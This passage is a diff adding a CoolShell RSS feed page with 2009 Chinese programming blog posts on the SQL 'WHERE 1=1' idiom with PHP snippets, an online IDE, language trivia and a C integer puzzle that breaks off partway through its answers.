@@ -1,0 +1,1590 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>第 34 页 &#8211; 酷 壳 &#8211; CoolShell</title>
+	<atom:link href="https://coolshell.cn/feed?paged=34" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Sat, 25 Sep 2010 04:59:05 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>SQL的Where语句</title>
+		<link>https://coolshell.cn/articles/1889.html</link>
+					<comments>https://coolshell.cn/articles/1889.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 01 Dec 2009 05:48:25 +0000</pubDate>
+				<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Database]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[SQL]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1889</guid>
+
+					<description><![CDATA[<p>某DBA在查看自己的数库日志的时候，看到了数据库服务器上出现了很多很怪异的SQL的Where条件语句，是下面这个样子：（所有的where语句前都有了一个叫“1=...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1889.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1889.html">SQL的Where语句</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>某DBA在查看自己的数库日志的时候，看到了数据库服务器上出现了很多很怪异的SQL的Where条件语句，是下面这个样子：（所有的where语句前都有了一个叫“1=1”的子条件）呵呵。</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="alignnone size-full wp-image-1890" title="SQL Where Clause" src="https://coolshell.cn/wp-content/uploads/2009/12/sql.where_.clause.jpg" alt="SQL Where Clause" width="460" height="631" srcset="https://coolshell.cn/wp-content/uploads/2009/12/sql.where_.clause.jpg 460w, https://coolshell.cn/wp-content/uploads/2009/12/sql.where_.clause-219x300.jpg 219w, https://coolshell.cn/wp-content/uploads/2009/12/sql.where_.clause-197x270.jpg 197w" sizes="(max-width: 460px) 100vw, 460px" /></p>
+<p>要理解这个事情的原因其实并不难。只要你是一个编写数据库的程序员，你就会知道——动态生成where后的条件的“麻烦”，那就是条件的“分隔”-and或or。下面听我慢慢说来。</p>
+<p><span id="more-1889"></span></p>
+<p>我们知道，大多数的查询表单都需要用户输出一堆查询条件，然后我们的程序在后台要把这些子条件用and组合起来。于是，把and加在各个条件的中间就成为了一件“难事”，因为你的程序需要判断：</p>
+<ul>
+<li>如果没有条件的话，则不需要where</li>
+<li>如果只有一个条件的话，不需要and.</li>
+<li>如果有多个条件的话，
+<ul>
+<li>如果and是持续加在每个条件后面的话，那么就要判断是否是最后一个条件，因为最后一个不能加and.</li>
+<li>同样，如果and是要加在每个条件前面的话，你就需要判断是否是第一个，如果是，那就不加。</li>
+</ul>
+</li>
+</ul>
+<p>真是TMD太烦了，所以，编程“大拿”引入了“1=1”条件语句。于是，编程的难度大幅度下降，你可以用单一的方式来处理这若干的查询子条件了。而1=1应该会被数据库引擎优化时给去掉了。</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+&lt;pre&gt;&lt;code&gt;$query = &quot;SELECT name FROM table WHERE 1=1 &quot;;
+
+foreach($clauses as $key =&gt; $value){
+    $query .= &quot; AND &quot;.escape($key).&quot;=&quot;.escape($value).&quot; &quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+</pre>
+<p>呵呵，<strong>DBA怎么能够理解我们疯狂程序员的用心良苦啊</strong>。</p>
+<p>另外，在这里说一下，这样的做法看似很愚蠢，但很有效，在PHP的世界中，也有人使用下面这样的做法——使用了PHP的implode函数。</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+&lt;pre&gt;&lt;code&gt;/**
+ * @param string $base base of query, e.g. UPDATE table SET
+ * @param string $logic logic for concatenating $assoc, e.g. AND
+ * @param array $assoc associative array of `field`=&gt;&#039;value&#039; pairs to concatenate and append to $base
+ * @param string $suffix additional clauses, e.g. LIMIT 0,30
+ * @return string
+ */
+function construct_sql($base, $logic, $clauses, $suffix=&#039;&#039;)
+{
+    // initialise array to avoid warnings/notices on some PHP installations
+    $queries = array();
+
+    // create array of strings to be glued together by logic
+    foreach($clauses as $key =&gt; $value)
+        $queries[] = &quot;`&quot; . escape($key) . &quot;`=&#039;&quot; . escape($value) . &quot;&#039;&quot;;
+
+    // add a space in case $base doesn&#039;t have a space at the end and glue clauses together
+    $query .= &quot; &quot; . implode(&quot; $logic &quot;,$queries) . &quot; &quot; . $suffix . &quot;;&quot;;
+
+    return $query;
+}
+
+/**
+ * @param string $str string to escape for intended use
+ * @return string
+ */
+function escape($str)
+{
+    return mysql_real_escape_string($str);
+}
+&lt;/code&gt;&lt;/pre&gt;
+</pre>
+<p>于是，我们可以这样使用：（<code>为什么我们要在update语句后加上“Limit 1”呢？这个关系到性能问题，关于这方面的话题，你可以查看本站的《<a title="MySQL性能优化的最佳20+条经验" href="https://coolshell.cn/articles/1846.html">MySQL性能优化的最佳20+条经验</a>》</code>）</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+&lt;pre&gt;&lt;code&gt;$updates = array(
+    &#039;field1&#039;=&gt;&#039;val1&#039;
+    &#039;field2&#039;=&gt;&#039;val2&#039;
+);
+$wheres = array(
+    &#039;field1&#039;=&gt;&#039;cond1&#039;,
+    &#039;field2&#039;=&gt;&#039;cond2&#039;
+);
+echo construct_sql(construct_sql(&quot;UPDATE table SET&quot;, &quot;, &quot;, $updates) . &quot; WHERE &quot;, &quot; AND &quot;, $wheres),&quot;LIMIT 1&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;/pre&gt;
+</pre>
+<p><code>下面是输出结果：</code></p>
+<p><code data-enlighter-language="php" class="EnlighterJSRAW">UPDATE table SET `field1`=&#039;val1&#039;, `field2`=&#039;val2&#039; WHERE `field1`=&#039;cond1&#039; AND `field2`=&#039;cond2&#039; LIMIT 1;</code></p>
+<p> </p>
+<p><code>（全文完）</code><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/7270.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/05/overview2-1-150x150.png" alt="NoSQL 数据建模技术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7270.html" class="wp_rp_title">NoSQL 数据建模技术</a></li><li ><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="开源中最好的Web开发的资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a></li><li ><a href="https://coolshell.cn/articles/1846.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/11/unoptimized_explain-150x150.jpg" alt="MySQL性能优化的最佳20+条经验" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1846.html" class="wp_rp_title">MySQL性能优化的最佳20+条经验</a></li><li ><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg" alt="程序员疫苗：代码注入" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a></li><li ><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/muxnt-150x150.jpg" alt="代码执行的效率" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_title">代码执行的效率</a></li><li ><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg" alt="性能调优攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1889.html">SQL的Where语句</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1889.html/feed</wfw:commentRss>
+			<slash:comments>20</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Coderun.com 在线开发IDE</title>
+		<link>https://coolshell.cn/articles/1883.html</link>
+					<comments>https://coolshell.cn/articles/1883.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 01 Dec 2009 05:41:12 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[编程工具]]></category>
+		<category><![CDATA[Coderun.com]]></category>
+		<category><![CDATA[Coding]]></category>
+		<category><![CDATA[IDE]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1883</guid>
+
+					<description><![CDATA[<p>相信大家都还记得我以前向大家推荐的《在线代码编译服务Codepad.org》吧。这回的这个更猛——在线的代码开发的IDE，可以编译，执行，调试。不过，主要针对W...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1883.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1883.html">Coderun.com 在线开发IDE</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>相信大家都还记得我以前向大家推荐的《<a rel="bookmark" href="https://coolshell.cn/articles/1310.html">在线代码编译服务Codepad.org</a>》吧。这回的这个更猛——在线的代码开发的IDE，可以编译，执行，调试。不过，主要针对Web方面的，主要是C#，ASP.NET，Javascript(JQuery)和PHP，很强大哦。那句话是怎么说来的——“如果一个软件可以用Javascript来写，那么这个软件的最终版本会是Javascript”。这个在线的IDE是：</p>
+<p style="text-align: center;"><a href="http://www.coderun.com/ide/" target="_blank"><strong>http://www.coderun.com/ide/</strong></a></p>
+<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg"><img decoding="async" loading="lazy" class="alignnone size-medium wp-image-1884" title="Coderun.com 在线开发IDE（点击看大图）" src="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_-300x225.jpg" alt="Coderun.com 在线开发IDE（点击看大图）" width="300" height="225" srcset="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_-300x225.jpg 300w, https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_-768x576.jpg 768w, https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg 1024w, https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_-360x270.jpg 360w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p style="TEXT-ALIGN: left">有朋友在留言中说，这个项目可能不实用，没什么意思，而我想说，Google的Chrome OS项目可能非常喜欢这个东西。顺便说一下，这个Online的IDE是开源的，源码在这里：<a href="http://coderun.codeplex.com/">http://coderun.codeplex.com/</a>。 </p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/pretty-code-150x150.gif" alt="Chrome开发者工具的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a></li><li ><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/10/drawing-recursive-150x150.jpg" alt="如何读懂并写出装逼的函数式代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_title">如何读懂并写出装逼的函数式代码</a></li><li ><a href="https://coolshell.cn/articles/11094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/02/example_visual_language_sketchpad_01-150x150.jpg" alt="可视化编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11094.html" class="wp_rp_title">可视化编程</a></li><li ><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/12/yoda-lambda-150x150.png" alt="函数式编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_title">函数式编程</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1883.html">Coderun.com 在线开发IDE</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1883.html/feed</wfw:commentRss>
+			<slash:comments>115</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Javascript程序员嘴最脏??</title>
+		<link>https://coolshell.cn/articles/1850.html</link>
+					<comments>https://coolshell.cn/articles/1850.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 30 Nov 2009 00:16:54 +0000</pubDate>
+				<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[C++]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<category><![CDATA[Perl]]></category>
+		<category><![CDATA[PHP]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1850</guid>
+
+					<description><![CDATA[<p>请看下图，我在Google Code上，针对每个程序语言都搜索了一下“fuck”一词的出现文件的个数X，以及没有出现fuck一词的文件的个数Y，然后放在Exce...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1850.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1850.html">Javascript程序员嘴最脏??</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>请看下图，我在Google Code上，针对每个程序语言都搜索了一下“fuck”一词的出现文件的个数X，以及没有出现fuck一词的文件的个数Y，然后放在Excel里求了一下百分比（X/(X+Y) * 100%），做了一个图。结果，JavaScript语言中出现的次数高达0.56%，名列全部语言之首，然后是Perl，C 和 PHP。（对于Javascript程序员的这种行为可以理解，因为IE，因为浏览器嘛，我就不多说了）</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="alignnone size-full wp-image-1851" title="Google Code 中程序语言出现 fuck 一词的比率" src="https://coolshell.cn/wp-content/uploads/2009/11/programming_language.jpg" alt="Google Code 中程序语言出现 fuck 一词的比率" width="543" height="303" srcset="https://coolshell.cn/wp-content/uploads/2009/11/programming_language.jpg 543w, https://coolshell.cn/wp-content/uploads/2009/11/programming_language-300x167.jpg 300w, https://coolshell.cn/wp-content/uploads/2009/11/programming_language-360x200.jpg 360w, https://coolshell.cn/wp-content/uploads/2009/11/programming_language-484x270.jpg 484w" sizes="(max-width: 543px) 100vw, 543px" /></p>
+<p style="text-align: left;">相关的数据表格如下：</p>
+<p style="text-align: left;"><span id="more-1850"></span></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="alignnone size-full wp-image-1852" title="Google Code 中程序语言出现 fuck 一词的比率" src="https://coolshell.cn/wp-content/uploads/2009/11/programming_language_table.jpg" alt="Google Code 中程序语言出现 fuck 一词的比率" width="262" height="225" /></p>
+<p style="text-align: left;">（全文完）</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/2053.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/20.jpg" alt="最为奇怪的程序语言的特性" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2053.html" class="wp_rp_title">最为奇怪的程序语言的特性</a></li><li ><a href="https://coolshell.cn/articles/1839.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/11/oscar-meyer-wienermobile-150x150.jpg" alt="编程语言汽车" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1839.html" class="wp_rp_title">编程语言汽车</a></li><li ><a href="https://coolshell.cn/articles/1532.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="到处都是Unix的胎记" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1532.html" class="wp_rp_title">到处都是Unix的胎记</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/10739.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/12/lua-150x150.gif" alt="Lua简明教程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10739.html" class="wp_rp_title">Lua简明教程</a></li><li ><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="数据即代码：元驱动编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_title">数据即代码：元驱动编程</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1850.html">Javascript程序员嘴最脏??</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1850.html/feed</wfw:commentRss>
+			<slash:comments>86</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>编程语言时间地理图</title>
+		<link>https://coolshell.cn/articles/1863.html</link>
+					<comments>https://coolshell.cn/articles/1863.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 29 Nov 2009 23:33:04 +0000</pubDate>
+				<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[programming language]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1863</guid>
+
+					<description><![CDATA[<p> 有人使用Google Map做了一个网页，把所有编程语言的时间线和地理位置，如下图，上面是一个编程语言的时间轴，下面是Google Map地图，点击编程语言，...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1863.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1863.html">编程语言时间地理图</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
+<p style="text-align: left;"> 有人使用Google Map做了一个<a href="http://www.geospat.com/hoprola/" target="_blank">网页</a>，把所有编程语言的时间线和地理位置，如下图，上面是一个编程语言的时间轴，下面是Google Map地图，点击编程语言，你可以查看该编程语言的发明者，发明地，和其Hello World示例（点击<a href="https://coolshell.cn/articles/169.html" target="_blank">这里</a>查看更多的Hello World）</p>
+<p style="text-align: center;"><a href="http://www.geospat.com/hoprola/" target="_blank"><strong>http://www.geospat.com/hoprola/</strong></a><br />
+<a href="https://coolshell.cn/wp-content/uploads/2009/11/programming_language_timeline.jpg" target="_blank"><img decoding="async" loading="lazy" title="编程语言时间地理图（点击看大图）" src="https://coolshell.cn/wp-content/uploads/2009/11/programming_language_timeline.jpg" alt="编程语言时间地理图" width="1013" height="606" /></a></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="alignnone size-full wp-image-1861" title="JavaScript 的发明者，发明地和示例" src="https://coolshell.cn/wp-content/uploads/2009/11/programming_language_timeline_javascript.jpg" alt="JavaScript 的发明者，发明地和示例" width="330" height="297" srcset="https://coolshell.cn/wp-content/uploads/2009/11/programming_language_timeline_javascript.jpg 330w, https://coolshell.cn/wp-content/uploads/2009/11/programming_language_timeline_javascript-300x270.jpg 300w" sizes="(max-width: 330px) 100vw, 330px" /></p>
+<p style="text-align: center;">（点击小星，可以看到语言的发明者和示例）</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/02/programming-language-150x150.jpg" alt="千万别惹程序员 " width="150" height="150" /></a><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_title">千万别惹程序员 </a></li><li ><a href="https://coolshell.cn/articles/4626.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="读书笔记：对线程模型的批评" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4626.html" class="wp_rp_title">读书笔记：对线程模型的批评</a></li><li ><a href="https://coolshell.cn/articles/3385.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/12/rank_scatter1-150x150.png" alt="编程语言流行度" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3385.html" class="wp_rp_title">编程语言流行度</a></li><li ><a href="https://coolshell.cn/articles/3100.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/10/language-evolution-150x150.jpg" alt="编程语言进化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3100.html" class="wp_rp_title">编程语言进化</a></li><li ><a href="https://coolshell.cn/articles/2724.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/07/aboutprogramming04.eng_-150x150.jpg" alt="计算机编程简史图" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2724.html" class="wp_rp_title">计算机编程简史图</a></li><li ><a href="https://coolshell.cn/articles/2598.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/22.jpg" alt="五个编程语言设计的失误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2598.html" class="wp_rp_title">五个编程语言设计的失误</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1863.html">编程语言时间地理图</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1863.html/feed</wfw:commentRss>
+			<slash:comments>8</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>C 语言整型谜题</title>
+		<link>https://coolshell.cn/articles/1857.html</link>
+					<comments>https://coolshell.cn/articles/1857.html#comments</comments>
+		
+		<dc:creator><![CDATA[joe]]></dc:creator>
+		<pubDate>Sat, 28 Nov 2009 16:45:17 +0000</pubDate>
+				<category><![CDATA[C/C++语言]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[C++]]></category>
+		<category><![CDATA[整型]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1857</guid>
+
+					<description><![CDATA[<p>如题，此篇文章是描述C语言中的整数谜题。 假定机器字长是32位的，用2的补码表示整数。对以下C表达式，请问它们在所有情况下都正确吗？如果不是，请给出反例。 初始...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1857.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1857.html">C 语言整型谜题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>如题，此篇文章是描述C语言中的整数谜题。</p>
+<p>假定机器字长是32位的，用2的补码表示整数。对以下C表达式，请问它们在所有情况下都正确吗？如果不是，请给出反例。</p>
+<p>初始化：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">int x = foo();
+int y = bar();
+unsigned ux = x;
+unsigned uy = y;</pre>
+<p>1. 若x &lt; 0, 则x * 2 &lt; 0</p>
+<p>2. ux &gt;= 0</p>
+<p>3. 若x &amp; 7 == 7， 则(x &lt;&lt; 30) &lt; 0</p>
+<p>4. ux &gt; -1</p>
+<p>5. 若x &gt; y, 则-x &lt; -y</p>
+<p>6. x * x &gt;= 0</p>
+<p>7. 若x &gt; 0 &amp;&amp; y &gt; 0, 则x + y &gt; 0</p>
+<p>8. 若x &gt;= 0, 则-x &lt;= 0</p>
+<p>9. 若x &lt;= 0, 则-x &gt;= 0</p>
+<p>答案如下：</p>
+<p><span id="more-1857"></span></p>
+<p>1. 错。当x = INT_MIN</p>
+<p>2. 正确。</p>
+<p>3. 正确。</p>
+<p>4. 错。-1被转换成UINT_MAX</p>
+<p>5. 错。当x = -1, y = INT_MIN</p>
+<p>6. 错。当x = 65535</p>
